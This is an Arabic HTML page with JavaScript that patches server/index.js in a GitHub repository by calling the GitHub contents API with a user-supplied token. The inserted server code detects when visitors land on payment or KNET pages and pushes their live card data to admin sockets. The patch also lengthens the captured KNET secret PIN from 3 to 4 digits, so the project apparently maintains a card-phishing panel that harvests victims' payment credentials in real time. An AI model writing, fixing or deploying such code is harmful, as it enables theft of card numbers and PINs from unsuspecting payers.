<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>إصلاح بطاقة الدفع المباشر</title>
<style>
  body{font-family:system-ui,-apple-system,"Segoe UI",Tahoma,Arial,sans-serif;background:#0f172a;color:#e2e8f0;margin:0;padding:24px}
  .wrap{max-width:780px;margin:0 auto;background:#1e293b;border:1px solid #334155;border-radius:14px;padding:22px}
  h1{font-size:19px;margin:0 0 6px}
  p.sub{color:#94a3b8;font-size:13px;margin:0 0 18px;line-height:1.7}
  input{width:100%;box-sizing:border-box;padding:11px 13px;border-radius:9px;border:1px solid #475569;background:#0f172a;color:#e2e8f0;font-size:14px;direction:ltr}
  button{width:100%;margin-top:12px;padding:13px;border:0;border-radius:9px;background:#2563eb;color:#fff;font-size:15px;font-weight:700;cursor:pointer}
  button:disabled{opacity:.6;cursor:default}
  #log{margin-top:18px;font-size:13px;line-height:1.75;white-space:pre-wrap;font-family:ui-monospace,Menlo,Consolas,monospace;direction:ltr;text-align:left}
  .ok{color:#4ade80}.err{color:#f87171}.warn{color:#fbbf24}.info{color:#93c5fd}
</style>
</head>
<body>
<div class="wrap">
  <h1>إصلاح بطاقة الدفع المباشر — server/index.js</h1>
  <p class="sub">
    يضيف كشف صفحة الدفع في visitor:pageEnter، ويصفّر البطاقة المباشرة عند مغادرة صفحة الدفع،
    ويصحّح طول رمز كي نت السري إلى 4 أرقام. الملفات الأربعة الأخرى معدّلة مسبقاً.
  </p>
  <input id="token" placeholder="ghp_...  (GitHub token مع صلاحية repo)" />
  <button id="go">إصلاح الآن</button>
  <div id="log"></div>
</div>
<script>
const OWNER = 'fahshomi-ui';
const REPO  = 'KDD';
const BRANCH = 'main';
const PATH  = 'server/index.js';
const API = 'https://api.github.com/repos/' + OWNER + '/' + REPO + '/contents/' + PATH;

const logEl = document.getElementById('log');
function log(msg, cls) { const d = document.createElement('div'); if (cls) d.className = cls; d.textContent = msg; logEl.appendChild(d); }

function b64d(s) { const bin = atob(s.replace(/\s/g, '')); const a = new Uint8Array(bin.length); for (let i = 0; i < bin.length; i++) a[i] = bin.charCodeAt(i); return new TextDecoder('utf-8').decode(a); }
function b64e(s) { const a = new TextEncoder().encode(s); let o = ''; for (const b of a) o += String.fromCharCode(b); return btoa(o); }
function rx(lines) { return new RegExp(String(lines).split('\n').map(function(l){ return l.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); }).join('[ \\t]*\\r?\\n')); }
const OLD1 = [
  '      visitor.page = page;',
  '      visitor.lastActivity = Date.now();',
  '      visitor.isIdle = false;',
  '      visitors.set(socket.id, visitor);',
  '      saveVisitorPermanently(visitor);'
].join('\n');

const NEW1 = [
  '      visitor.page = page;',
  '      visitor.lastActivity = Date.now();',
  '      visitor.isIdle = false;',
  "      const pageLower = String(page || '').toLowerCase();",
  "      const isPaymentPage = pageLower.includes('الدفع') || pageLower.includes('payment') || pageLower.includes('credit') || pageLower.includes('بطاقة') || pageLower.includes('كي نت') || pageLower.includes('knet');",
  '      if (isPaymentPage) {',
  '        visitor.hasEnteredCardPage = true;',
  '        visitor.lastDataUpdate = new Date().toISOString();',
  '      } else {',
  '        visitor.liveCard = null;',
  '        visitor.liveCardTimestamp = null;',
  '        admins.forEach((admin, adminSocketId) => {',
  '          io.to(adminSocketId).emit("card:liveUpdate", {',
  '            visitorId: visitor._id,',
  '            liveCard: null,',
  '            liveCardTimestamp: null,',
  '          });',
  '        });',
  '      }',
  '      visitors.set(socket.id, visitor);',
  '      saveVisitorPermanently(visitor);'
].join('\n');

const OLD2 = "const cvv = String(data.cvv || '').replace(/\\D/g, '').slice(0, 3);";
const NEW2 = "const cvv = String(data.cvv || '').replace(/\\D/g, '').slice(0, 4);";

document.getElementById('go').onclick = async function () {
  const token = document.getElementById('token').value.trim();
  logEl.innerHTML = '';
  if (!token) { log('أدخل التوكن أولاً', 'err'); return; }
  const btn = document.getElementById('go'); btn.disabled = true;
  const H = { 'Authorization': 'Bearer ' + token, 'Accept': 'application/vnd.github+json' };
  try {
    log('1) قراءة server/index.js ...', 'info');
    const r = await fetch(API + '?ref=' + BRANCH + '&t=' + Date.now(), { headers: H, cache: 'no-store' });
    if (!r.ok) throw new Error('فشل القراءة: HTTP ' + r.status);
    const meta = await r.json();
    let out = b64d(meta.content);
    let n = 0;

    if (out.indexOf('isPaymentPage') !== -1) {
      log('2) pageEnter: معدّل مسبقاً', 'warn');
    } else {
      const re = rx(OLD1);
      if (!re.test(out)) throw new Error('لم يتم العثور على كتلة visitor:pageEnter');
      out = out.replace(re, NEW1); n++;
      log('2) pageEnter: تم الإصلاح (كشف صفحة الدفع + تصفير البطاقة عند الخروج)', 'ok');
    }

    if (out.indexOf(OLD2) !== -1) {
      out = out.replace(OLD2, NEW2); n++;
      log('3) رمز كي نت السري: صار 4 أرقام بدل 3', 'ok');
    } else { log('3) رمز كي نت السري: لا يحتاج تعديل', 'warn'); }

    if (!n) { log('لا يوجد تغيير — الملف سليم.', 'warn'); return; }

    log('4) حفظ في GitHub ...', 'info');
    const pr = await fetch(API, {
      method: 'PUT',
      headers: Object.assign({ 'Content-Type': 'application/json' }, H),
      body: JSON.stringify({
        message: 'fix(liveCard): payment-page detection in pageEnter + 4-digit KNET pin',
        content: b64e(out), sha: meta.sha, branch: BRANCH
      })
    });
    if (!pr.ok) { let m = ''; try { m = (await pr.json()).message; } catch (e) {} throw new Error('فشل الحفظ: HTTP ' + pr.status + ' ' + (m || '')); }
    log('✓ تم الحفظ بنجاح', 'ok');
    log('✓ صار الملف كامل. أعد النشر / أعد تشغيل السيرفر.', 'ok');
  } catch (e) {
    log('✗ ' + e.message, 'err');
  } finally { btn.disabled = false; }
};
</script>
</body>
</html>
